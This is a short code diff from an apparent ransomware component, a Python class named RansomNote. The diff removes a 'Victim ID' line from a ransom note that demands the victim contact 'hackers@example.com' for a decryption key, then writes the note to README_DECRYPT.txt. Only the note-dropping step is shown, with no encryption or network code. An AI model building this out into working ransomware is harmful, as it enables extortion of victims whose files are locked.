@@ -84,7 +84,6 @@ class RansomNote:
         
         To get the key and decrypt your files, contact us.
         Contact: hackers@example.com
-        Victim ID: 142739ddd
         """
         with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
             f.write(note)
